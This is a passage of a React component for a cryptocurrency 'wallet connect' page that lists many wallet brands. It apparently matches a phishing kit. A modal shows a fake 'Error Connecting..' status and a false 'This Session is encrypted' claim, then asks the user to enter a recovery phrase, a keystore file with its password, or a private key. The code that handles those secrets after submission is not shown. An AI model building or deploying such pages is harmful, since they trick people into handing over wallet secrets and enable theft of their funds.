                <div className="wallet-logo-s-title">Keplr</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Harmony")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Harmony}
                  />
                </div>
                <div className="wallet-logo-s-title">Harmony</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("ICONex")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={ICONex}
                  />
                </div>
                <div className="wallet-logo-s-title">ICONex</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Fetch")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Fetch}
                  />
                </div>
                <div className="wallet-logo-s-title">Fetch</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("XDC")}>
                  <img alt="logo-img" className="modal-wallet-logo" src={XDC} />
                </div>
                <div className="wallet-logo-s-title">XDC</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Unstoppable")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Unstoppable}
                  />
                </div>
                <div className="wallet-logo-s-title">Unstoppable</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("MEET")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={MEET}
                  />
                </div>
                <div className="wallet-logo-s-title">MEET</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Dok")}>
                  <img alt="logo-img" className="modal-wallet-logo" src={Dok} />
                </div>
                <div className="wallet-logo-s-title">Dok</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("AT")}>
                  <img alt="logo-img" className="modal-wallet-logo" src={AT} />
                </div>
                <div className="wallet-logo-s-title">AT</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("MoriX")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={MoriX}
                  />
                </div>
                <div className="wallet-logo-s-title">MoriX</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Midas")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Midas}
                  />
                </div>
                <div className="wallet-logo-s-title">Midas</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Ellipal")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Ellipal}
                  />
                </div>
                <div className="wallet-logo-s-title">Ellipal</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("KEYRING")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={KEYRING}
                  />
                </div>
                <div className="wallet-logo-s-title">KEYRING</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Blockchain")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Blockchain}
                  />
                </div>
                <div className="wallet-logo-s-title">Blockchain</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("BSC")}>
                  <img alt="logo-img" className="modal-wallet-logo" src={BSC} />
                </div>
                <div className="wallet-logo-s-title">BSC</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Solana")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Solana}
                  />
                </div>
                <div className="wallet-logo-s-title">Solana</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Aktionariat")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Aktionariat}
                  />
                </div>
                <div className="wallet-logo-s-title">Aktionariat</div>
              </div>
            </Grid>
          </Grid>
        </Grid>
      </div>
      <div className="">
        <Modal
          isOpen={isModalVisible1}
          // onAfterOpen={afterOpenModal}
          onRequestClose={handleModal4}
          style={customStyles1}
          ariaHideApp={false}
        >
          <div className="close-modal" onClick={handleModal4}>
            <div className="s-modal-header">
              <div style={{ color: "blue" }}>Back</div>
              <div> X </div>
            </div>
          </div>
          <div className="s-modal-manual-grp b-header">
            <Grid container spacing={1}>
              <Grid item xs={7}>
                <div className="s-modal-text-connect">{conname}</div>
              </Grid>
              <Grid item xs={5}>
                {conname === "Error Connecting.." ? (
                  <>
                    <button
                      className="s-modal-manual-btn"
                      onClick={handleModal2}
                    >
                      connect Manually
                    </button>
                  </>
                ) : (
                  <></>
                )}
              </Grid>
            </Grid>
          </div>
          <div className="s-modal-manual-grp">
            <Grid container spacing={1}>
              <Grid item xs={10}>
                <div className="s-modal-text-wallet-name">{wname}</div>
                <div className="s-modal-text-wallet-session">
                  This Session is encrypted
                </div>
              </Grid>
              <Grid item xs={2}>
                <img
                  src={imgurl}
                  alt="logo-img"
                  className="s-modal-logo s-s-modal-logo"
                />
              </Grid>
            </Grid>
          </div>
        </Modal>
      </div>
      <Modal
        isOpen={isModalVisible}
        // onAfterOpen={afterOpenModal}
        onRequestClose={handleModal}
        style={customStyles}
        ariaHideApp={false}
      >
        {/* <div
          style={{
            textAlign: "end",
            color: "Black",
            width: "3%",
            marginLeft: "97%",
            cursor: "pointer",
          }}
          onClick={handleModal2}
        >
          {" "}
          X{" "}
        </div> */}
        <div style={{ textAlign: "center" }}>
          <Grid container justifyContent="center">
            <Grid item xs={12}>
              <div className="s-modal-top-grp">
                <img alt="logo-img" src={imgurl} className="s-modal-logo"></img>
                <div className="s-modal-title">Import Your {wname} Wallet</div>
              </div>
            </Grid>
          </Grid>
        </div>
        <Tabs>
          <TabList>
            <Tab>Phrase</Tab>
            <Tab>Keystore Json</Tab>
            <Tab>Private Key</Tab>
          </TabList>

          <TabPanel>
            <Grid container spacing={2} justifyContent="center">
              <Grid item xs={12}>
                <textarea
                  className="tab_textarea"
                  placeholder="Enter your recovery pharse"
                  onChange={e => setPhrase(e.target.value)}
                />
              </Grid>
              <Grid item xs={12}>
                <div className="tab_text">
                  Typically 12 (sometimes 24) words separated by single spaces
                </div>
              </Grid>
              <Grid item xs={12}>
                <button className="s-modal-process-btn" onClick={() => handleModal3("Phrase")}>
                  <div style={{ display: "inline-flex" }}>
                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                      PROCEED
                    </div>
                    <div className="svg-icon">
                      <svg
                        fill="none"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                        className="h- w-6"
                      >
                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </Grid>
              <Grid item xs={12}>
                <div className="cancel_btn_grp">
                  <button className="s-modal-cancel-btn" onClick={handleModal2}>
                    Cancel
                  </button>
                </div>
              </Grid>
            </Grid>{" "}
          </TabPanel>
          <TabPanel>
            <Grid container spacing={2} justifyContent="center">
              <Grid item xs={12}>
                <textarea
                  className="tab_textarea"
                  placeholder="Keystore JSON"
                  onChange={e => setKeyStore(e.target.value)}
                />
              </Grid>
              <Grid item xs={12}>
                <input
                  type="text"
                  className="tab_text_ipt"
                  placeholder="Wallet Password"
                  onChange={e => setWalletPassword(e.target.value)}
                />
              </Grid>
              <Grid item xs={12}>
                <div className="tab_text">
                  Several lines of text beginning with ... plus the password you
                  used to encrypt it.
                </div>
              </Grid>
              <Grid item xs={12}>
                <button className="s-modal-process-btn" onClick={() => handleModal3("KeyStore")}>
                  <div style={{ display: "inline-flex" }}>
                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                      PROCEED
                    </div>
                    <div className="svg-icon">
                      <svg
                        fill="none"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                        className="h- w-6"
                      >
                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </Grid>
              <Grid item xs={12}>
                <div className="cancel_btn_grp">
                  <button className="s-modal-cancel-btn" onClick={handleModal2}>
                    Cancel
                  </button>
                </div>
              </Grid>
            </Grid>{" "}
          </TabPanel>
          <TabPanel>
            <Grid container spacing={2} justifyContent="center">
              <Grid item xs={12}>
                <input
                  type="text"
                  className="tab_text_ipt"
                  placeholder="Enter your Private Key"
                  onChange={e => setPrivate(e.target.value)}
                />
              </Grid>
              <Grid item xs={12}>
                <div className="tab_text">
                  Typically 12 (sometimes 24) words seperated by a single space.
                </div>
              </Grid>
              <Grid item xs={12}>
                <button className="s-modal-process-btn" onClick={() => handleModal3("PrivateKey")}>
                  <div style={{ display: "inline-flex" }}>
                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                      PROCEED
                    </div>
                    <div className="svg-icon">
                      <svg
                        fill="none"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                        className="h- w-6"
                      >
                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </Grid>
              <Grid item xs={12}>
                <div className="cancel_btn_grp">
                  <button className="s-modal-cancel-btn" onClick={handleModal2}>
                    Cancel
                  </button>
                </div>
              </Grid>
            </Grid>
          </TabPanel>
        </Tabs>
      </Modal>
    </>
  );
}
